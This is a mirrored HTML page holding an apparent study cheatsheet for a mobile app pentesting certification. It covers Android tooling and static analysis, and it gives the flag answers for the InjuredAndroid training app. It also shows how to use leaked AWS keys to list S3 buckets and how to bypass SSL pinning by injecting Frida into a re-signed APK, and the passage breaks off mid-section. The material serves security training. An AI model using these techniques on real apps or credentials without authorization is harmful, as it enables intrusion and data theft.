@@ -1,0 +1,1364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from www.emmanuelsolis.com/pjmt.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>PJMT | Cheatsheet</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="img/favicon.png" rel="icon">
+  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Prism CSS -->
+  <link href="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="PJMT Cheatsheet">
+  <meta property="og:description" content="A list of commands and tips for PJMT.">
+  <meta property="og:image" content="img/favicon.png">
+  <meta property="og:url" content="pjmt.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="PJMT Cheatsheet">
+  <meta name="twitter:description" content="A list of commands and tips for PJMT.">
+  <meta name="twitter:image" content="img/favicon.png">
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <img src="img/profile-img.jpg" alt="" class="img-fluid rounded-circle">
+        <h1 class="text-light"><a href="index-2.html">Emmanuel Solis</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/emmasolis/" target="_blank" class="linkedin"><i
+              class="bx bxl-linkedin"></i></a>
+          <a href="https://github.com/emmasolis1" target="_blank" class="github"><i class="bx bxl-github"></i></a>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="index-2.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="resume.html" class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i> <span>Resume</span></a></li>
+          <li><a href="portfolio.html" class="nav-link scrollto"><i class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
+          <li><a href="https://coff.ee/emmanuelsolis" target="_blank" class="nav-link scrollto"><i class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li>
+          <li class="dropdown">
+            <a href="cheatsheets.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i class="bi bi-hdd-stack navicon"></i>Cheatsheets <span class="arrow">▼</span></a>
+            <ul id="submenu" class="submenu open">
+              <li><a href="ad_pentesting.html" class="nav-link scrollto"><i class="bi bi-shield-lock navicon"></i>Active Directory Pentesting</a></li>
+              <li><a href="mobile_pentesting.html" class="nav-link scrollto"><i class="bi bi-phone navicon"></i>Mobile Pentesting</a></li>
+              <li><a href="oscp.html" class="nav-link scrollto"><img src="img/oscp_icon.png" alt="OSCP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
+              <li><a href="oswp.html" class="nav-link scrollto"><img src="img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
+              <li><a href="pjmt.html" class="nav-link scrollto active"><img src="img/pjmt_icon.png" alt="PJMT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">PJMT</a></li>
+              <li><a href="red_teaming.html" class="nav-link scrollto"><i class="bi bi-shield-lock navicon"></i>Red Teaming</a></li>
+              <li><a href="security_plus.html" class="nav-link scrollto"><img src="img/security_icon.png" alt="Security+ Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">Security+</a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>PJMT Cheatsheet</h2>
+          <ol>
+            <li><a href="index-2.html">Home</a></li>
+            <li>PJMT Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <!-- ======= Disclaimer Alert ======= -->
+            <div class="alert alert-warning alert-dismissible fade show" role="alert" data-aos="fade-right">
+              <strong>Disclaimer:</strong> This site compiles various <u>publicly available</u> cheatsheets, commands,
+              and guides, along with some personal edits. It is not associated with or endorsed by TCM Security or any
+              other
+              organization. If you have any concerns about the content, please review the references section. For
+              further inquiries, feel free to contact me.
+              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            <div class="cheatsheet-content">
+              <h2 id="1-introduction">1. <span class="emoji">📖</span> Introduction</h2>
+              <h3 id="11-mobile-app-penetration-testing-process">1.1 Mobile App Pentesting Process</h3>
+              <h4 id="111-reconnaissance">1.1.1 Reconnaissance</h4>
+              <ul>
+                <li>Gather information about the company and the mobile application.</li>
+                <li>Locate the target app on app distribution platforms like the Play Store or Apple Store.</li>
+                <li>Identify and document different versions of the app, including patch notes and update history.</li>
+              </ul>
+              <h4 id="112-static-analysis">1.1.2 Static Analysis</h4>
+              <ul>
+                <li>Review the app&#39;s source code using both manual methods and automated tools.</li>
+                <li>Search for hardcoded sensitive information and potential security misconfigurations within the app.
+                </li>
+                <li>Use the findings to determine if further analysis or additional reconnaissance is needed.</li>
+              </ul>
+              <h4 id="113-dynamic-analysis">1.1.3 Dynamic Analysis</h4>
+              <ul>
+                <li>Execute the app and interact with it to identify vulnerabilities.</li>
+                <li>Capture and analyze network traffic using tools like Burp Suite or Proxyman.</li>
+                <li>Extract and examine memory dumps for insecurely stored secrets.</li>
+                <li>Investigate local storage for files generated during runtime that might expose sensitive data.</li>
+                <li>Assess the app for vulnerabilities typically associated with the OWASP Top Ten.</li>
+              </ul>
+              <h4 id="114-reporting">1.1.4 Reporting</h4>
+              <ul>
+                <li>Prepare a report that includes an executive summary and detailed descriptions of the discovered
+                  vulnerabilities.</li>
+                <li>Assign severity levels to each finding and provide step-by-step instructions to reproduce the
+                  issues.</li>
+              </ul>
+              <h3 id="12-android-security-architecture">1.2 Android Security Architecture</h3>
+              <ul>
+                <li><strong>Android&#39;s Foundation</strong>: Based on the Linux operating system, it utilizes similar
+                  commands and file permission structures.</li>
+                <li><strong>App Isolation</strong>: Each application runs in a virtual machine (VM) environment known as
+                  the Android Runtime (ART), which interprets bytecode into device-specific instructions. This VM is
+                  sandboxed to prevent apps from interfering with one another.</li>
+                <li><strong>File System Segregation</strong>: Android creates a unique user ID (UID) for each app,
+                  isolating their data in the file system. This approach ensures that apps cannot access each
+                  other&#39;s data unless explicitly permitted.</li>
+                <li><strong>Profiles and Data Management</strong>: Android supports multiple profiles, such as work and
+                  personal, which keep data separate while allowing necessary system-level interactions. User roles like
+                  Primary user, Guest, and Kid mode further enhance data security and user experience.</li>
+                <li><strong>Key Layers of Android Architecture</strong>:<ul>
+                    <li><strong>Linux Kernel</strong>: Provides support for various CPU types and manages device
+                      components via drivers. It also governs the minimum SDK version (minSDKVersion) apps must meet,
+                      balancing security with broader device compatibility.</li>
+                    <li><strong>Hardware Abstraction Layer (HAL)</strong>: Enables apps to interact with device hardware
+                      without depending on the manufacturer, supporting a wide range of hardware components, including
+                      those in newer technologies like IoT and automotive.</li>
+                    <li><strong>Native Libraries (C/C++) and ART Libraries</strong>: Native libraries operate directly
+                      on the device without needing a VM, while ART libraries facilitate app development using languages
+                      like Java or Kotlin.</li>
+                    <li><strong>Java API Layer</strong>: Supports app interaction with other apps and device functions.
+                      It includes components like Content Providers for data sharing, the View system for UI design, and
+                      various managers for handling notifications, telephony, packages, and location services.</li>
+                    <li><strong>System Apps</strong>: These are pre-installed applications on Android devices. Users can
+                      replace system apps with their preferred alternatives.</li>
+                  </ul>
+                </li>
+              </ul>
+              <h3 id="13-app-security--signing-process">1.3 App Security &amp; Signing Process</h3>
+              <ul>
+                <li><strong>Reverse Engineering</strong>: Android apps can be decompiled, modified, and recompiled using
+                  tools like JADX-GUI or Apktool.</li>
+                <li><strong>App Integrity</strong>: The integrity of apps is maintained through a signing process that
+                  employs public-key cryptography. Android uses multiple signature verification methods, including APK
+                  signature schemes v1, v2, and v3, with additional Google Play signing for enhanced security.</li>
+              </ul>
+              <h3 id="14-setup-instructions">1.4 Setup Instructions</h3>
+              <ol>
+                <li>
+                  <p><strong>Install Required Tools</strong>:</p>
+                  <ul>
+                    <li><code>adb</code>, <code>apktool</code>, <code>jadx-gui</code>, and <code>Android Studio</code>
+                      are essential for conducting analysis and testing. </li>
+                    <li>Android Studio is best installed on the host machine as it may not perform well on virtual
+                      machines.</li>
+                  </ul>
+                </li>
+                <li>
+                  <p><strong>Using Android Studio</strong>:</p>
+                  <ul>
+                    <li>Utilize features such as Device File Explorer, Terminal, Logcat, and AVD Manager to interact
+                      with and analyze mobile apps.</li>
+                    <li>In AVD Manager, create virtual devices with different API levels (e.g., API 29 and API 23) to
+                      simulate various environments.</li>
+                  </ul>
+                </li>
+                <li>
+                  <p><strong>Working with Rooted Devices</strong>:</p>
+                  <ul>
+                    <li>On virtual devices that do not include Google Play, you can use the <code>adb root</code>
+                      command to gain root access and run additional commands within <code>adb shell</code>.</li>
+                    <li>Devices with Google Play installed typically do not allow <code>adb root</code> access.</li>
+                  </ul>
+                </li>
+              </ol>
+              <h3 id="15-install-utilities">1.5 Install Utilities</h3>
+              <ul>
+                <li>For Windows</li>
+              </ul>
+              <pre><code class="language-bash"># Install Java from https://www.java.com/en/
+
+# Install JADX-GUI from the GitHub (https://github.com/skylot/jadx) releases section (https://github.com/skylot/jadx/releases/tag/v1.2.0) and choose the .exe
+
+# Install abd from Android Platform Tools https://developer.android.com/studio/releases/platform-tools ; then copy the platform-tools folder downloaded to C:\Windows or add the PATH to ENVIRONMENT_VARIABLES
+
+# Install abd from https://ibotpeaches.github.io/Apktool/ and follow the instructions for installing
+
+# Install Android Studio
+</code></pre>
+              <ul>
+                <li>For Kali</li>
+              </ul>
+              <pre><code class="language-bash"># ------- Option 1: install all the requirements automatically.
+# PimpMyKali (install all required tools)
+git clone https://github.com/Dewalt-arch/pimpmykali
+cd pimpmykali
+sudo ./pimpmykali.sh
+# Select Option A MAPT
+# Check that it was installed correctly (see manual for the following tools):
+abg
+apktool
+jadx-gui
+
+# ------- Options 2: install tools manually
+sudo apt-get install adb
+sudo apt-get install apktool # Reference: https://ibotpeaches.github.io/Apktool
+sudo apt-get install default-jdk
+sudo apt-get install jadx
+</code></pre>
+              <ul>
+                <li>For Mac</li>
+              </ul>
+              <pre><code class="language-bash"># Install Brew
+/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;
+
+# JADX-GUI
+brew install jadx
+
+# apktool
+brew install apktool
+
+# Install Android Studio in the host machine
+
+# Android Platform Tools
+brew install android-platform-tools
+</code></pre>
+              <ul>
+                <li>Emulator Setup &amp; Recommendations</li>
+              </ul>
+              <pre><code class="language-bash"># It is important to choose emulators that have access to the Google Play, and have at least 2-3 emualators:
+Nexus 5 - Q - 29 - x86 - Android 10.0
+Nexus 5 - Something like - API Level (22-24) - x86
+</code></pre>
+              <ul>
+                <li>Access emulators running in host from the VM</li>
+              </ul>
+              <pre><code class="language-bash"># On the host (in case of getting the error no-bind kill the task, command for Windows)
+ipconfig
+abd -a nodaemon server
+taskkill /f /im adb.exe
+
+# On the Kali: (example) abd -H 192.168.127.182 -P 5037 shell
+abd -H [host_IP] -P 5037 [command]
+</code></pre>
+              <ul>
+                <li>Access Extended Controls</li>
+              </ul>
+              <pre><code class="language-bash"># Different options to access
+Press F1
+or
+Go to File &gt; Settings &gt; Emulator &gt; Uncheck the option &#39;Launch in a tool window&#39; 
+</code></pre>
+              <h2 id="2-android-static-analysis">2. <span class="emoji">🛠️</span> Android Static Analysis</h2>
+              <h3 id="21-pulling-an-apk-from-the-play-store">2.1 Pulling an APK from the Play Store</h3>
+              <p>Under <code>AVD Manager</code>, run the virtual device (configured with API level 29), navigate to the
+                Google Play Store, sign into a Google account, and download the <code>Injured Android</code> app. If
+                you&#39;re unable to find the app on Play Store, download it from GitHub instead: <a
+                  href="https://github.com/B3nac/InjuredAndroid">https://github.com/B3nac/InjuredAndroid</a>.</p>
+              <pre><code class="language-bash"># Step 1: Install the app on the virtual device; then open Terminal in Android Studio
+
+# Step 2: Launch the shell for the virtual device
+adb shell
+
+# Step 3: Verify the current user (should return &#39;shell&#39;)
+whoami
+
+# Step 4: List all installed apps
+pm list packages
+
+# Step 5: Search for the InjuredAndroid package
+pm list packages | grep injured
+
+# Expected output: Package name &#39;b3nac.injuredandroid&#39; for InjuredAndroid
+
+# Step 6: Retrieve the file path for the app
+pm path b3nac.injuredandroid
+
+# Step 7: Exit the shell to return to your system
+exit
+
+# Step 8: Create a directory for storing the APK
+mkdir ApkFolder
+
+# Step 9: Navigate into the created directory
+cd ApkFolder
+
+# Step 10: Pull the APK from the virtual device to your system
+adb pull &lt;file path for injuredandroid&gt; injuredandroid-pulled.apk
+
+# Step 11: Open the pulled APK in JADX-GUI to view the source code
+
+# Note: If the APK cannot be opened in JADX-GUI, there might be a Java version mismatch. Adjust accordingly.
+</code></pre>
+              <h3 id="22-manual-static-analysis">2.2 Manual Static Analysis</h3>
+              <p>The vulnerable app used in this course is <a
+                  href="https://play.google.com/store/apps/details?id=b3nac.injuredandroid&amp;hl=en_US&amp;gl=US">InjuredAndroid</a>,
+                which is structured as a Capture the Flag (CTF) challenge. The source code is available on <a
+                  href="https://github.com/B3nac/InjuredAndroid">GitHub</a>. The app includes flags that can be tracked
+                directly within the application.</p>
+              <p><strong>Important Considerations:</strong></p>
+              <ol>
+                <li>
+                  <p><strong>Android Manifest.xml Overview:</strong></p>
+                  <ul>
+                    <li>Every Android app includes an <a
+                        href="https://developer.android.com/guide/topics/manifest/manifest-intro"><code>Android Manifest.xml</code>
+                        file</a>, which defines critical app details such as:<ul>
+                        <li><code>minSDKVersion</code>: Specifies the minimum Android API level required to run the app.
+                        </li>
+                        <li><a
+                            href="https://developer.android.com/reference/android/Manifest.permission">Permissions</a>:
+                          Lists the permissions needed by the app.</li>
+                        <li>Activities: UI components within the app.</li>
+                        <li>Content Providers: Facilitate data sharing between apps.</li>
+                      </ul>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <p><strong>Analyzing InjuredAndroid.apk:</strong></p>
+                  <ul>
+                    <li>When you open the <code>InjuredAndroid.apk</code> in <code>jadx-gui</code>, navigate to the
+                      <code>Resources</code> section to locate the <code>Android Manifest.xml</code> file.
+                    </li>
+                    <li>Key elements to observe:<ul>
+                        <li><code>minSdkVersion</code>: Indicates compatibility with Android API level 21 and above.
+                        </li>
+                        <li>Permissions: Found under the <code>&lt;uses-permission&gt;</code> tag, these indicate what
+                          the app requires.</li>
+                        <li>Exported Activities and Providers: Look for the <code>exported</code> attribute set to
+                          <code>True</code>, which could expose functionality to other apps.
+                        </li>
+                      </ul>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <p><strong>Decompiling the APK:</strong></p>
+                  <ul>
+                    <li>For manual static analysis, decompiling the APK with <code>apktool</code> can provide deeper
+                      insights:</li>
+                  </ul>
+                </li>
+              </ol>
+              <pre><code class="language-bash"># Decompiling the APK
+# &#39;d&#39; is for decompiling the APK
+# &#39;-r&#39; can be used to skip decompiling resources in large apps
+apktool d &lt;path-to-apk&gt; [-r]
+
+# Lists the directory containing the decompiled app files
+ls
+
+cd &lt;decompiled-directory&gt;
+ls
+# Shows the decompiled files &amp; folders for the app
+
+strings &lt;path-to-binary-file&gt;
+# Extracts strings from the specified binary file
+</code></pre>
+              <ol start="4">
+                <li><strong>Further Inspection:</strong>
+                  <ul>
+                    <li>Decompiling with <code>apktool</code> reveals additional files and folders not visible in
+                      <code>jadx-gui</code>.
+                    </li>
+                    <li>Focus on the <code>smali</code> folder, which contains the app&#39;s source code, similar to the
+                      code representation in <code>jadx-gui</code>. This can be valuable for deeper analysis and
+                      understanding of the app&#39;s behavior.</li>
+                  </ul>
+                </li>
+              </ol>
+              <ol start="5">
+                <li><strong>Review if they are exported activities (possible sensitive content exposed):</strong></li>
+              </ol>
+              <pre><code class="language-bash"># 1. Find the package name
+adb shell pm list packages | grep &lt;partial_package_name&gt;
+
+# 2. Find the activities in the AndroidManifest.xml.
+
+# 3. Start the activity
+adb shell am start -n com.example.app/.MainActivity </code></pre>
+              <p><strong>Methodology:</strong></p>
+              <ol>
+                <li>Search for misconfiguration in AndroidManifest.xml.</li>
+                <li>Search for hardcoded strings; usually in the the <code>/Resources/</code> folder and the
+                  <code>strings.xml</code> and <code>.xml</code> files.
+                </li>
+                <li>Use tools to search for AWS, Firebase or other possibles Keys.</li>
+                <li>Send the application to a MobSF analysis.</li>
+                <li>Check the logs.</li>
+                <li>See if you can intercept the network traffic of the application; if necessary implement SSL Pinning.
+                </li>
+                <li>Check all the request trying to find possible vulnerabilities, in this case they can transform into
+                  web-based or API-based vulnerabilities.</li>
+                <li>Use <code>objection</code> to perform memory checks and other checks you may consider relevant to
+                  the application.</li>
+                <li>Use any other type of technique you could find relevant.</li>
+              </ol>
+              <h3 id="23-finding-hardcoded-strings">2.3 Finding Hardcoded Strings</h3>
+              <p>Hardcoded strings can often be located in <code>resources/strings.xml</code> and within activity source
+                code. These strings may pose various threat vectors, including login bypasses (username/password,
+                credentials), exposed URLs (http/https), API keys, and Firebase URLs (firebase.io).</p>
+              <p>To investigate these strings in <code>jadx-gui</code>, open the XML files located at
+                <code>/Resources/resources.arsc/res/values/</code>. Look for notable entries in <code>strings.xml</code>
+                such as <code>default_web_client_id</code>, <code>google_api_key</code>, <code>google_app_id</code>,
+                <code>google_crash_reporting_api_key</code>, <code>google_storage_bucket</code>, and
+                <code>firebase_database_url</code>. Utilize the <code>Ctrl+F</code> function to search for these
+                keywords within the file.
+              </p>
+              <p>Additionally, <code>jadx-gui</code> supports searching across all files for keywords, making it
+                possible to search for terms like <code>http://</code>, <code>https://</code>, <code>API</code>,
+                <code>password</code>, <code>firebase</code>, and <code>sql</code> to uncover other hardcoded sensitive
+                information.
+              </p>
+              <h3 id="24-injured-android-static-analysis">2.4 Injured Android Static Analysis</h3>
+              <p><strong>Flag 1</strong>:</p>
+              <ul>
+                <li>To locate Flag 1, examine the source code in <code>jadx-gui</code>. Navigate to
+                  <code>/Source code/b3nac.injuredandroid/FlagOneLoginActivity</code>.
+                </li>
+                <li>The flag is <code>F1ag_0n3</code>.</li>
+              </ul>
+              <p><strong>Flag 2</strong>:</p>
+              <ul>
+                <li>The clues provided are <code>activity</code> and <code>exported</code>.</li>
+                <li>In the <code>AndroidManifest.xml</code> file, search for <code>exported=true</code>.</li>
+                <li>Copy the names of the activities found and test them. For instance, try
+                  <code>b3nac.injuredandroid.b25lActivity</code>.
+                </li>
+                <li>You can access these exported activities from anywhere on your device using the following command:
+                  <pre><code class="language-bash">adb shell
+# Open a shell on the device
+
+am start b3nac.injuredandroid/.b25lActivity
+# Launch the activity from the app
+# This will navigate to a new UI where you can retrieve the second flag
+</code></pre>
+                </li>
+              </ul>
+              <p><strong>Flag 3</strong>:</p>
+              <ul>
+                <li>This flag is related to &#39;Resources&#39;.</li>
+                <li>Examine the source code for flag 3. Like flag 1, it involves a string comparison to verify the flag.
+                </li>
+                <li>The comparison is done with <code>R.string.cmVzb3VyY2VzX3lv</code>, which suggests that this string
+                  may be in the <code>strings.xml</code> file.</li>
+                <li>Searching for <code>cmVzb3VyY2VzX3lv</code> within the <code>strings.xml</code> file will reveal the
+                  flag.</li>
+              </ul>
+              <p><strong>Flag 4</strong>:</p>
+              <ul>
+                <li>The clue for this flag involves &quot;classes and imports&quot;.</li>
+                <li>Begin by checking the source code for flag 4.</li>
+                <li>Within the relevant function, a byte object is instantiated from the class <code>C1489g</code>.</li>
+                <li>Search for the class <code>C1489g</code> in all files or double-click its name to locate its source
+                  code.</li>
+                <li>This class contains a base64-encoded string. Decoding this string will provide the flag.</li>
+              </ul>
+              <h3 id="25-enumerating-aws-storage-buckets">2.5 Enumerating AWS Storage Buckets</h3>
+              <p>In the <code>InjuredAndroid</code> app, Flag 8 relates to AWS CLI and AWS Storage. To find relevant
+                information, search for AWS-related strings, particularly in the <code>strings.xml</code> file, which
+                can be a crucial resource.</p>
+              <p>When decompiling the APK with <code>apktool</code>, you can find <code>strings.xml</code> at
+                <code>/res/values/</code>. In <code>jadx-gui</code>, it is located at
+                <code>/Resources/resources.arsc/res/values/</code>. This file may contain <code>AWS_ID</code> and
+                <code>AWS_SECRET</code>, although these values might be removed in newer releases.
+              </p>
+              <p>If <code>AWS_ID</code> and <code>AWS_SECRET</code> are present, you can use tools such as <a
+                  href="https://github.com/initstring/cloud_enum"><code>cloud_enum</code></a> and <code>awscli</code> to
+                gather further information.</p>
+              <pre><code class="language-bash"># Replace `&lt;path-to-cloud_enum.py&gt;`, `&lt;search-term&gt;`, `&lt;profile-name&gt;`, and `&lt;bucket-name&gt;` with the appropriate values for your context.
+
+# Install AWS CLI
+sudo apt-get install awscli
+
+# Setup cloud_enum from GitHub
+# Fuzz for the term &#39;&lt;search-term&gt;&#39;
+# This may reveal an S3 bucket
+python3 &lt;path-to-cloud_enum.py&gt; -k &lt;search-term&gt;
+
+# Configure AWS CLI
+# Enter AWS_ID and AWS_SECRET when prompted
+aws configure --profile &lt;profile-name&gt;
+
+# List contents of the S3 bucket
+aws s3 ls s3://&lt;bucket-name&gt; --profile &lt;profile-name&gt;
+</code></pre>
+              <h3 id="26-enumerating-firebase-databases">2.6 Enumerating Firebase Databases</h3>
+              <ul>
+                <li>To find Flag 9, you need to enumerate Firebase databases.</li>
+                <li>From <code>strings.xml</code>, you obtained a Firebase URL, such as
+                  <code>https://{firebase_project_id}.firebaseio.com/</code>.
+                </li>
+                <li>Access this URL using tools like Postman or Burp Suite.</li>
+                <li>The response should be a database dump containing the flag.</li>
+              </ul>
+              <h3 id="27-automated-analysis-using-mobsf">2.7 Automated Analysis using MobSF</h3>
+              <p><strong>MobSF (Mobile Security Framework)</strong> is an automated, all-in-one static analysis tool for
+                APKs, IPAs, and mobile apps:</p>
+              <pre><code class="language-bash"># Pull the latest MobSF image
+docker pull opensecurity/mobile-security-framework-mobsf
+
+# Start the MobSF container
+docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+
+# Download the APK and navigate to the folder
+cd {directory_for_apk}
+wget {apk_download_url}
+
+# Open MobSF in your browser
+open http://localhost:8000
+
+# Upload the APK to MobSF
+# MobSF performs the static analysis
+# Flag 1 can be found under &#39;Hardcoded Strings&#39;
+</code></pre>
+              <p><strong>Additional Commands &amp; Suggestions</strong>:</p>
+              <ol>
+                <li>
+                  <p><strong>Proguard Mapping File</strong>: if the APK uses Proguard for code obfuscation, check for
+                    the Proguard mapping file within the decompiled APK to understand the code structure.</p>
+                </li>
+                <li>
+                  <p><strong>Third-Party Libraries</strong>: convert the <code>classes.dex</code> file to a JAR file
+                    using <code>Dex2jar</code>, which can then be inspected with tools like <code>jd-gui</code> or other
+                    Java decompilers:</p>
+                </li>
+              </ol>
+              <pre><code class="language-bash">dex2jar {apk_file_name}
+# Converts the dex file to jar
+</code></pre>
+              <ol start="3">
+                <li>
+                  <p><strong>SSL Pinning</strong>: detect SSL pinning by inspecting network security configurations or
+                    analyzing the code for custom certificate validation methods.</p>
+                </li>
+                <li>
+                  <p><strong>API Calls</strong>: review network requests by analyzing the manifest or using tools like
+                    Burp Suite with the Android emulator to intercept and analyze traffic.</p>
+                </li>
+              </ol>
+
+              <h2 id="3-android-dynamic-analysis">3. <span class="emoji">🎮</span> Android Dynamic Analysis</h2>
+              <h3 id="31-burpsuite-configuration">3.1 BurpSuite Configuration</h3>
+              <p><strong>How to configure and setup the proxy</strong></p>
+              <ol>
+                <li>Configure Burp Suite proxy listener on port 8082, bound to all interfaces</li>
+                <li>Set up manual proxy on the running emulator</li>
+                <li>Navigate to the extended controls, and set 127.0.0.1:8082 as the proxy</li>
+                <li>Export CA certificate from Burp Suite</li>
+                <li>Save the certificate as &#39;filename.CER&#39; (required format)</li>
+                <li>Install the certificate on the emulator</li>
+                <li>Drag and drop the .CER file, and install it via
+                  <code>Settings &gt; Trusted Credentials &gt; Install from SD Card</code>.
+                </li>
+                <li>Enable interception in Burp Suite</li>
+                <li>Toggle <code>Intercept</code> to On, and Burp Suite will start capturing traffic from the emulator.
+                </li>
+              </ol>
+              <h3 id="32-ssl-pinning">3.2 SSL Pinning</h3>
+              <p>SSL Pinning is a security measure used to prevent Man-In-The-Middle (MITM) attacks by ensuring that the
+                app only communicates with servers having a specific certificate. However, some apps may not trust a
+                root certificate, requiring additional steps for interception.</p>
+              <p><strong>Steps for SSL Interception</strong></p>
+              <ol>
+                <li><strong>Start and Configure Proxy:</strong> Set up your proxy software (e.g., Burp Suite, Proxyman).
+                </li>
+                <li><strong>Configure Device Proxy:</strong> Set the emulator or device to use the proxy.</li>
+                <li><strong>Intercept HTTP Traffic:</strong> Capture unencrypted traffic.</li>
+                <li><strong>Install CA Certificate:</strong>
+                  <ul>
+                    <li>Import and trust the CA certificate in the Android Certificate Store.</li>
+                  </ul>
+                </li>
+                <li><strong>Intercept HTTPS Traffic:</strong>
+                  <ul>
+                    <li>If SSL Pinning blocks interception (shamed test failed), use tools like Objection or Frida.</li>
+                  </ul>
+                </li>
+              </ol>
+              <h3 id="33-automatic-patching-with-objection">3.3 Automatic Patching with Objection</h3>
+              <p>Objection allows you to automatically inject Frida into an APK for runtime mobile exploration.</p>
+              <pre><code class="language-bash"># 1. Install the required tools
+pip3 install frida-tools objection
+
+# 2. Patch the APK using Objection, replace &lt;APK_NAME&gt; with your APK file name
+objection patchapk --source &lt;APK_NAME&gt;.apk
+
+# The patched APK will be saved with a new name (e.g., &lt;APK_NAME&gt;.objection.apk). You can install this patched APK on the emulator.
+</code></pre>
+              <h3 id="34-manual-patching">3.4 Manual Patching</h3>
+              <p>Manual patching involves injecting Frida into the APK and signing it.</p>
+              <pre><code class="language-bash"># 1. Decompile the APK, replace &lt;APK_NAME&gt; with your APK file name
+apktool d -r &lt;APK_NAME&gt;.apk
+
+# 2. Download the appropriate Frida gadget for the emulator&#39;s architecture
+wget https://github.com/frida/frida/releases/download/&lt;FRIDA_VERSION&gt;/frida-gadget-&lt;FRIDA_VERSION&gt;-android-&lt;ARCH&gt;.so.xz
+
+# 3. Extract and rename the Frida gadget
+unxz frida-gadget-&lt;FRIDA_VERSION&gt;-android-&lt;ARCH&gt;.so.xz
+mv frida-gadget-&lt;FRIDA_VERSION&gt;-android-&lt;ARCH&gt;.so libfrida-gadget.so
+
+# 4. Move the Frida gadget into the appropriate lib folder
+mv libfrida-gadget.so ~/path/to/decompiled/apk/lib/&lt;ARCH&gt;/
+
+# 5. Inject the Frida gadget into the APK&#39;s SMALI code; add the following line to the main activity’s SMALI file
+const-string v0, &quot;frida-gadget&quot;
+invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V
+
+# 6. Recompile the APK, replace &lt;OUTPUT_APK&gt; with the desired output file name
+apktool b &lt;APK_NAME&gt; -o &lt;OUTPUT_APK&gt;.apk
+
+# 7. Create a new keystore for signing the APK
+keytool -genkey -v -keystore &lt;KEYSTORE_NAME&gt;.keystore -alias &lt;ALIAS_NAME&gt; -keyalg RSA -keysize 2048 -validity 10000
+
+# 8. Sign the APK using jarsigner, replace &lt;PASSWORD&gt; with your keystore password
+jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore &lt;KEYSTORE_NAME&gt;.keystore -storepass &lt;PASSWORD&gt; &lt;OUTPUT_APK&gt;.apk &lt;ALIAS_NAME&gt;
+
+# 9. Verify the APK is signed
+jarsigner -verify &lt;OUTPUT_APK&gt;.apk
+
+# 10. Align the APK, replace &lt;FINAL_APK&gt; with the final output file name
+zipalign 4 &lt;OUTPUT_APK&gt;.apk &lt;FINAL_APK&gt;.apk
+
+# 11. Install the final APK on the emulator and explore with Objection
+objection explore
+</code></pre>
+              <h3 id="35-dynamic-analysis-with-mobsf">3.5 Dynamic Analysis with MobSF</h3>
+              <p>MobSF allows dynamic analysis of Android applications. This setup does not require a device with the
+                Google Play Store, and supports up to Android API 28.</p>
+              <pre><code class="language-bash"># 1. List all available Android Virtual Devices (AVDs)
+emulator -list-avds
+
+# 2. Start an AVD with writable system and no snapshot, replacing &lt;AVD_NAME&gt; with the desired AVD name
